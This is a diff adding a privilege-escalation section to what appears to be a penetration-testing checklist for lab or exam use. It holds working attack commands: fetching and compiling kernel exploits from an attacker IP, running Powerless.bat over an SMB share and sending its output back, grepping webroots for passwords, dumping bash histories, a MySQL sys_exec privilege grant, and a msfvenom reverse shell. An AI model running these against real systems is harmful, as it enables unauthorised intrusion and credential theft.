@@ -1,4 +1,16 @@
-# Checklist -
+[Network Sweep]
+[Enumerate Services]
+[Investigate Other Services]
+[Enumerating HTTP]
+[Enumerate Web Application]
+[SQLi]
+[OS Command Injection]
+[Remote Code Execution]
+[Buffer Overflow Dev]
+[Privilege Escalation Basics]
+[PrivEsc - Windows Checklist]
+[PrivEsc - Linux Checklist]
+
 # Network Sweep
 
 
@@ -318,3 +330,49 @@ msfvenom -a x86 --platform windows/linux -p something/shell/reverse_tcp lhost=x.
 
 Make sure it fits your payload length above
 
+# Privilege Escalation 
+#### Linux
+searchsploit CentOS 4. | grep /local/ (look for kernel version)
+searchsploit linux kernel 4.4.0 | grep 16.04 (search by kernel, grep for release)
+Transfer and compile on target machine to account for dependencies
+wget http://192.168.1.223/9495.c -P /var/tmp
+gcc -o centos45 9495.c 
+chmod +x centos45
+./centos45
+#### Windows
+Searchsploit ??? | grep /local/ (look for?)
+windows-exploit-suggester.py -d 2019-05-17-mssb.xls -i sysinfo
+Windows local exploit must be compiled on Kali with:
+i686-w64-mingw32-gcc ms11-046.c -lws2_32 -o adfsys.exe 
+cscript wget.vbs http://10.11.0.148/adfsys.exe -O C:\lec\go.exe
+icacls adfsys.exe /grant NINA\nina:(M)
+
+smbserver.py leshare /var/www/html/scripts/
+copy \\10.10.14.19\leshare\Powerless.bat
+Powerless.bat > \\10.10.14.19\leshare\powerOUT.txt
+
+#### Priv-Esc Basic Enumeration
+Quick Wins - Credentials from (Web) Service files
+If web services were running and was an avenue to enter (or not), check the webroot! Especially if there was a Logon Page - the checklogin.php file must have a mechanism to access the SQL database to authenticate users.. Check it 
+grep -r -i “password” /var/www/
+Examples:
+/var/www/https/wproot/wp-config.php
+/var/www/html/check_logon.php
+Bash History is also good to read through
+find /home/ -type f -iname ".bash_history" -exec cat {} \;
+Thoroughly enumerate User folders
+/home/bob/
+C:\Users\Bob
+#### Other Services
+Database - is MySQL running as root? 
+https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
+https://www.exploit-db.com/exploits/1518 (linux)
+https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/
+select sys_exec('usermod -a -G admin john');
+If running third-party FTP, SMTP or something in the name of the machine!, maybe check those folders out.. Looking for .conf and .ini and passwd files.
+#### Scripts
+Windows
+https://github.com/M4ximuss/Powerless
+https://github.com/GDSSecurity/Windows-Exploit-Suggester
+Linux
+https://github.com/sleventyeleven/linuxprivchecker/
